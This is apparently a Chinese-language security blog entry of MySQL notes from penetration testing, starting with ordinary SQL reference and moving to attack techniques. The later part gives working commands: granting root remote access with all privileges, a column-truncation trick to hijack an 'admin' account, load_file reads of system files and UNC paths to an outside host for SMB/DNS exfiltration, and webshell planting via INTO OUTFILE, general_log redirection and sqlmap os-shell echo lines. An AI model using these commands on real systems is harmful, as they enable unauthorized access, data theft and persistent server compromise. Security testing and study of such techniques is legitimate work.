    <content type="text"><![CDATA[渗透测试中遇到一些MySQL问题 常用操作语句用户管理 新建用户： CREATE USER name IDENTIFIED BY ‘ssapdrow’; 更改密码： SET PASSWORD FOR name=PASSWORD(‘fdddfd’); 权限管理 SHOW GRANTS FOR name; //查看name用户权限GRANT SELECT ON db_name. TO name; //给name用户db_name数据库的所有权限REVOKE SELECT ON db_name. TO name; //GRANT的反操作，去除权限； 数据库操作 查看数据库： SHOW DATABASES; 创建数据库： CREATE DATABASE db_name; //db_name为数据库名 使用数据库： USE db_name; 删除数据库： DROP DATABASE db_name; 创建表 创建表：1234567CREATE TABLE table_name(id TINYINT UNSIGNED NOT NULL AUTO_INCREMENT, //id值，无符号、非空、递增——唯一性，可做主键。name VARCHAR(60) NOT NULLscore TINYINT UNSIGNED NOT NULL DEFAULT 0, //设置默认列值PRIMARY KEY(id))ENGINE=InnoDB //设置表的存储引擎，一般常用InnoDB和MyISAM；InnoDB可靠，支持事务；MyISAM高效不支持全文检索DEFAULT charset=utf8; //设置默认的编码，防止数据库中文乱码 如果有条件的创建数据表还可以使用 &gt;CREATE TABLE IF NOT EXISTS tb_name(…….. 复制表： CREATE TABLE tb_name2 SELECT * FROM tb_name;或者部分复制：CREATE TABLE tb_name2 SELECT id,name FROM tb_name; 创建临时表： CREATE TEMPORARY TABLE tb_name(这里和创建普通表一样); 查看数据库中可用的表： SHOW TABLES; 查看表的结构： DESCRIBE tb_name;也可以使用：SHOW COLUMNS in tb_name; //from也可以 删除表： DROP [ TEMPORARY ] TABLE [ IF EXISTS ] tb_name[ ,tb_name2…….];实例：DROP TABLE IF EXISTS tb_name; 表重命名： RENAME TABLE name_old TO name_new;还可以使用：ALTER TABLE name_old RENAME name_new; 插入数据 插入数据： INSERT INTO tb_name(id,name,score)VALUES(NULL,’张三’,140),(NULL,’张四’,178),(NULL,’张五’,134);这里的插入多条数据直接在后边加上逗号，直接写入插入的数据即可；主键id是自增的列，可以不用写。 插入检索出来的数据： INSERT INTO tb_name(name,score) SELECT name,score FROM tb_name2; 更新数据 指定更新数据： UPDATE tb_name SET score=189 WHERE id=2;UPDATE tablename SET columnName=NewValue [ WHERE condition ] 更新数据 指定更新数据： UPDATE tb_name SET score=189 WHERE id=2;UPDATE tablename SET columnName=NewValue [ WHERE condition ] MySQL外连 改表 vps上的MySQL不允许远程登陆，只能在127.0.0.1。这个时候只要在vps上，登入MySQL后，更改 MySQL数据库里的 user表里的 host 项，从localhost改称% 或添加一个用户为%。1234mysql -u root -pmysql&gt;use mysql;mysql&gt;update user set host = &apos;%&apos; where user = &apos;root&apos;;mysql&gt;select host, user from user; 授权 在MySQL服务器上MySQL命令行执行以下命令：12grant all privileges on *.* to root@&quot;%&quot; identified by &apos;rcoil&apos; with grant option; flush privileges; 其中上面两行代码的意思是给从任意ip地址连接的用户名为root，密码为abc的用户赋予所有的权限。其中的”%”为任意的ip地址，如果想设为特定的值也可以设定为特定的值。 利用 Navicat 自带的http隧道链接 我这里是本地做的测试。 就可以链接了。方便你我他。 MySQL数据截断问题之前在做ISCC的最后一道Web题上遇到的问题，但是一直忘了记录下来。 对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。先判断注册时的username与数据库里已存在的username是否数据重复，如果出现重复，我们可以用数据的超长截断来绕过这些判断，从而导致更新密码的作用（一个username多个passwd）。 原理： 比如一个表的结构是这样的：1create table admin(username varchar(10) not null,passwd varchar(10) not null); 可以看到username跟passwd的字节为10 但是这my.ini设置成sql-mode=”NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION”的话就算超出也会添加成功 mysql的 sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示 warning，而不是error，这样可能会导致一些截断问题。 123456789mysql&gt; insert into RcoIl(`username`,`passwd`) values(&quot;admin x&quot;, &quot;111&quot;)mysql&gt; select * from RcoIl;+----+-----------------+--------------+| id | username | passwd |+----+-----------------+--------------+| 1 | admin | 11 || 2 | admin | 111 |+----+-----------------+--------------+ 出现了两个admin的记录。 从而我们可以用另外的密码去登录admin账户 MySQL的读写 读文件 常见的读文件，可以用16进制代替字符串1234selectload_file(&apos;c:/boot.ini&apos;)selectload_file(0x633a2f626f6f742e696e69)selectload_file(&apos;//ecma.io/1.txt&apos;) # smb协议selectload_file(&apos;\\\\ecma.io\\1.txt&apos;) # 可用于DNS隧道 写文件已知唯一的写文件的方式 1select 0x313233 intooutfile &apos;D:/1.txt&apos; root权限写shell方法 union 1id=2) union select 1,2,3,4,5,6,7,&apos;&lt;? phpinfo(); ?&gt;’ into outfile ‘/home/wwwroot/lu4n.com/luan_phpinfo.php’# no union 1id=2) into outfile ‘/home/wwwroot/demo/phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’# 无outfile权限时写shell方法outfile被禁止，或者写入文件被拦截，root权限，在数据库中操作如下:1234show variables like &apos;%general%&apos;; // 查看mysql日志路径set global general_log=on; //开启日志set global general_log_file=&apos;xxx路径/1.php&apos;; //设置目录日志为shell地址select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; //随意执行一条mysql语句让其写入一句话到1.php文件里 os-shell查找绝对路径及写入前端随便查看某图片名字或者上传查看路径linux系统： 使用pwd查看当前路径逐层使用ls查找（如uploads）路径写入一句话os-shell&gt;echo \&lt;\php\ \@eval\(\$\_POST\[rcoil\]\)\;\?\&gt; &gt;/uploads/rcoil.php tips：当无法执行命令或者权限低时，可以使用/sbin/如：##/sbin/ifconfig windows系统： 在前端找到一张图片，查看图片名：rcoil.jpg使用dir /s /b d:\rcoil.jpg,就能查找rcoil.jpg的路径写入一句话os-shell&gt;echo ^&lt;%eval request(chr(123))%^&gt; &gt;&gt;d:\web\1.txt 当路径为中文名，没找到好方法。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
</search>
